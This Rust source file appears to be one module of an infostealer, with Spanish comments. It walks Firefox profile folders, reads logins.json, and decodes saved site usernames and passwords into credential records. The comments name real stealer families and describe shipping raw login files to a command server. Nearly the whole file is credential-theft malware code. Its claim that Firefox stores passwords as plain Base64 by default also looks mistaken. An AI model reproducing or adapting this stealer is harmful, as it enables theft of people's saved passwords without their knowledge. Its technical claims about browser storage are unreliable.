// Stealer para Mozilla Firefox
use crate::stealer::{Credential, StealerError, StealerResult};
use crate::stealer::common::{get_appdata_roaming, file_exists, base64_decode};
use std::path::PathBuf;

/// Roba credenciales de Firefox
pub fn steal_firefox() -> StealerResult<Vec<Credential>> {
    let appdata = get_appdata_roaming().ok_or(StealerError::BrowserNotFound)?;
    
    // Firefox almacena perfiles en: %APPDATA%\Mozilla\Firefox\Profiles
    let firefox_path = appdata.join(r"Mozilla\Firefox\Profiles");
    
    if !firefox_path.exists() {
        return Err(StealerError::BrowserNotFound);
    }

    let mut all_credentials = Vec::new();

    // Iterar sobre todos los perfiles de Firefox
    if let Ok(entries) = std::fs::read_dir(&firefox_path) {
        for entry in entries.flatten() {
            if entry.path().is_dir() {
                // Intentar extraer credenciales de este perfil
                match extract_firefox_profile(&entry.path()) {
                    Ok(mut creds) => all_credentials.append(&mut creds),
                    Err(_) => continue,  // Ignorar perfiles que fallan
                }
            }
        }
    }

    if all_credentials.is_empty() {
        Err(StealerError::BrowserNotFound)
    } else {
        Ok(all_credentials)
    }
}

/// Extrae credenciales de un perfil específico de Firefox
fn extract_firefox_profile(profile_path: &PathBuf) -> StealerResult<Vec<Credential>> {
    // Firefox almacena credentials en logins.json
    // Por defecto NO están encriptadas (solo Base64)
    // Solo se encriptan si el usuario configuró Master Password (raro)
    
    let logins_json = profile_path.join("logins.json");
    
    if !file_exists(&logins_json) {
        return Err(StealerError::DatabaseError("Firefox logins.json not found".into()));
    }

    // Leer logins.json
    let logins_content = std::fs::read_to_string(&logins_json)
        .map_err(|e| StealerError::IoError(e.to_string()))?;
    
    // Parsear logins.json (no necesitamos master key para la mayoría de casos)
    parse_firefox_logins(&logins_content, None)
}

/// Copia la base de datos a un archivo temporal
fn copy_db_to_temp(db_path: &PathBuf) -> StealerResult<PathBuf> {
    let temp_dir = std::env::temp_dir();
    let temp_name = format!("tmp_ff_{}.db", std::process::id());
    let temp_path = temp_dir.join(temp_name);
    
    std::fs::copy(db_path, &temp_path)
        .map_err(|e| StealerError::IoError(e.to_string()))?;
    
    Ok(temp_path)
}

/// Parsea logins.json y extrae credenciales
fn parse_firefox_logins(json_content: &str, _master_key: Option<&[u8]>) -> StealerResult<Vec<Credential>> {
    let mut credentials = Vec::new();
    
    // REALIDAD DE FIREFOX (basado en análisis de infostealers modernos):
    // - Por defecto, Firefox USA "username" y "password" (Base64, NO encriptados)
    // - SOLO si el usuario configuró Master Password, usa "encryptedUsername" y "encryptedPassword"
    // - El 99% de usuarios NO tiene Master Password configurada
    // 
    // Estrategia de infostealers reales (Satan, Hannibal, Ficker):
    // 1. Intentan campos en texto plano (username/password)
    // 2. Si fallan, simplemente ignoran (no vale la pena implementar NSS decrypt)
    //
    // Referencias:
    // - Satan-Stealer: Solo roba Chromium passwords, ignora Firefox completamente
    // - FickerStealer: Envía logins.json RAW al C2, el servidor hace decrypt
    // - Hannibal: "Firefox does not encrypt cookies at rest (unless a master password is set)"
    
    if let Some(logins_start) = json_content.find("\"logins\":[") {
        let logins_section = &json_content[logins_start..];
        
        // Buscar cada objeto login
        let mut pos = 0;
        while let Some(entry_start) = logins_section[pos..].find("{") {
            pos += entry_start;
            
            if let Some(entry_end) = logins_section[pos..].find("}") {
                let entry = &logins_section[pos..pos + entry_end + 1];
                
                // Extraer hostname
                let hostname = extract_json_field(entry, "hostname");
                
                // Firefox SIN Master Password: usa campos "username" y "password" (Base64)
                let plain_username = extract_json_field(entry, "username");
                let plain_password = extract_json_field(entry, "password");
                
                if let Some(url) = hostname {
                    if let (Some(user_b64), Some(pass_b64)) = (plain_username, plain_password) {
                        // Decodificar Base64 (Firefox codifica en Base64 pero NO encripta)
                        let username = base64_decode(&user_b64)
                            .ok()
                            .and_then(|bytes| String::from_utf8(bytes).ok())
                            .unwrap_or_else(|| user_b64.clone());  // Si falla decode, usar raw
                        
                        let password = base64_decode(&pass_b64)
                            .ok()
                            .and_then(|bytes| String::from_utf8(bytes).ok())
                            .unwrap_or_else(|| pass_b64.clone());  // Si falla decode, usar raw
                        
                        credentials.push(Credential {
                            browser: "Firefox".to_string(),
                            url,
                            username,
                            password,
                        });
                    }
                }
                
                pos += entry_end + 1;
            } else {
                break;
            }
        }
    }
    
    Ok(credentials)
}

/// Extrae un campo de un objeto JSON simple
fn extract_json_field(json: &str, field: &str) -> Option<String> {
    let pattern = format!("\"{}\":\"", field);
    if let Some(start) = json.find(&pattern) {
        let value_start = start + pattern.len();
        if let Some(end) = json[value_start..].find("\"") {
            return Some(json[value_start..value_start + end].to_string());
        }
    }
    None
}
